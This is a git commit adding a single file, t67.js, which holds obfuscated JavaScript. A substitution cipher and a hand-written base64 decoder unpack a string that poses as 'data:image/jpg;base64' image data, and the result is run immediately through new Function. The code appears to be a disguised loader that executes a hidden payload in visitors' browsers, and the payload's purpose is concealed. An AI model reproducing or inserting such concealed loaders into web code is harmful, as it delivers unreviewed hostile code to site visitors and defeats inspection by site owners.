cb5e420fd380354977a5542c5da77613f6858dd3
jisucdn <79298333+jisucdn@users.noreply.github.com>
2023-06-07 19:09:05 +0800

    Add files via upload

---
+++ t67.js
@@ -0,0 +1,52 @@
+    !(function () {
+            function mTMxtZ (s) {
+        var d = {"U":"d","C":"m","x":"F","0":"y","f":"I","Z":"G","b":"Q","l":9,"1":"Z","a":"j","O":"W","7":1,"F":"l","S":"b","D":"n","k":"s","M":"u","E":"Y","y":"X","s":"p","t":2,"X":0,"d":3,"n":"J","p":"B","H":"R","P":"t","e":"M","T":"C","r":5,"9":"U","Q":"N","N":"a","K":"L","L":"H","m":"i","J":"S","G":"q","W":"c","v":"h","8":"v","V":"T","3":"o","q":"O","A":"D","i":"x","g":"P","B":"E","w":"w","2":"z","5":4,"j":"V","4":7,"u":"K","6":"k","h":"f","c":"e","Y":"g","o":"r","I":"A","z":8,"R":6};
+        return s.split('').map(function (c) {
+            return d[c] !== undefined ? d[c] : c;
+        }).join('');
+    }
+            function RHQmVxC (e) {
+        var a0 = 'charAt', a1 = 'fromCharCode', a2 = 'charCodeAt', a3 = 'indexOf';
+        var sx = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' + 'abcdefghijklmnopqrstuvwxyz' + '0123456789+/=';
+        var t = "", n, r, i, s, o, u, a, f = 0;
+        e = e.replace(/[^A-Za-z0-9+/=]/g, "");
+        while (f < e.length) {
+            s = sx[a3](e[a0](f++));
+            o = sx[a3](e[a0](f++));
+            u = sx[a3](e[a0](f++));
+            a = sx[a3](e[a0](f++));
+            n = s << 2 | o >> 4;
+            r = (o & 15) << 4 | u >> 2;
+            i = (u & 3) << 6 | a;
+            t = t + String[a1](n);
+            if (u != 64) {
+                t = t + String[a1](r);
+            }
+            if (a != 64) {
+                t = t + String[a1](i);
+            }
+        }
+        return (function(e) {
+            var t = "", n = r = c1 = c2 = 0;
+            while (n < e.length) {
+                r = e[a2](n);
+                if (r < 128) {
+                    t += String[a1](r);
+                    n++;
+                } else if (r > 191 && r < 224) {
+                    c2 = e[a2](n + 1);
+                    t += String[a1]((r & 31) << 6 | c2 & 63);
+                    n += 2
+                } else {
+                    c2 = e[a2](n + 1);
+                    c3 = e[a2](n + 2);
+                    t += String[a1]((r & 15) << 12 | (c2 & 63) << 6 | c3 & 63);
+                    n += 3;
+                }
+            }
+            return t;
+        })(t);
+    };
+        var s = ["data:image\/jpg;base64,UCx0fZbl1ZlaUO7FSDbkSa7MEy1s1txXSdnSndpkEyHCSdnPn7XkEdel1TraUyn01OrX9tQ0NypXKL9lntUmSDxd1JrGWCF71LUmNDQvKCQ8SV3rqAW7n0isgVBteAe7QJiwgJU3ULHwW238K0WkUOx5gOrvUCFDEyH8Wmr7Wtj0bOUFSDb4NOE3uZ5CnmB8y67vEdiyNO58KDHFWdb3Sm6shLw3","fO5CnmlpSCH0StF6hZFg9dis9Zv8SC98NJrX1yQXuLjvcT6suyPtEyfYWdjkgJU3ULHwW238K0WoUJkDKdE0KdQXEyH2K2B2e2I0K0WoNVPs1mvMEy1s1txXSdfMWtjM1BnFEOQ8SmF4SCxtNOUvUZl0KDQFSCHT1OxaSt53WdjkuVPl1Oi21yPM1yWYJO7v1t93uJr2WCelWdjkqd7s1mv7EyYMNOr61yvg1mYDECxs1L9DuV","5PeJF4UCx0fLv3Wa7M1yWYOB7eJLHXWxnFWyjFWdb3uVP5NLfMSdpFSmYD9BlVjTWkntvXULp2qmz8n0P7u0W8UC30K0WoNJ64cZv0KDQFUxnFWyjFWdHf1Ox61yf3nXQ8SDHFSDbPjLFw1JWkntxwWZisEtxXNOlMKdYPUdUdKO18WCXPUynk1OraStHF1AkDuVP5NLfMWtjX9CjiUOj2UBvFEOHFWmYDOT7JHjxjHjQ9H9bP","jXF9JTWkn7vQVBvXULpJ1yx71yQXn064cZv0KClMWCjv1LF2UZxX1OQ3EOrD1V7CUOraUZF8SmYsctFCuLv3Wmr01Ox6cjQXEyHFgVXXnm15NLfMWdHvULj2gVX0eAIscd1vWmp6EyHvg9sVVX5MWZx0Wt93cZv0KDnFWdp8SDQFjZj5UT64SCjdfB17SCQXNOlMuTUhn0kDUTWontbDu0UaW0WkSCjdfB17SCQXNOlMuTUan0","i6EyHvKDnFWdjkUTr61OQ81Z9on2P01yH7WC5Yn0P6EyHvKDnFWdjkUTrMEO7Fu0W3E06DuJv6EyHvKDnFWdjkUTrsSOWMNClsSmYDn06suJvaW064hyX4cZv0KDQFSCb3nd9leJWsqd7FSLQFfZFCuxUFEFQ8EtPFUTECK7jAbDn8UdQFWDiHUOx0NdifUOxd1OFzjCFtSdiq1yU2bynXNOQk1JlsKDHFWdb3UOx5uJF4UCx0","fLU2gOrFU0py1OnVStQo1yb3ndU2W238KtUmUtj01mri1ZsmUdQwS0raStXRqV92QTldNae8n0PsuVPdW0r8SC7FWdQv1t9l1DjMEdHsSt531JF4UdeMEti8Wt93uVPM1yWYHDjMEdHsSt53n7lX1ZQ2n0iJJxxPjDvAuZ9M1ZxXEJ6suZQ2uVPlqdU2KClM1yn0Sdfl1DjMEdHsSt53uyPtEyfYW276StQ7SOjMUTraWCjvUZ","jxSZjP1OrXuTU2EdnsWLbDuVP2KDQ0E27wud9on0ltNaf8n0PsqtQ2KDpvWCjMUBjk1O7FSDbMNOr21ynXbCjCSdnFuLekEdesqd7l1Oi21yPtEyfYW276StQ7SOjMUTraWCjvUZjxSZjP1OrXuTU2EdnsWLbDuVP2KDQ0E27wud9on0ltNaf8n0PsqtQ2KDpvWCjMUBjk1O7FSDbMNOr21ynXbCjCSdnFuLekEdesqd7l"];
+        new Function('RHQmVxC', RHQmVxC(mTMxtZ(s.join('').substr(22))))(RHQmVxC);
+    })();
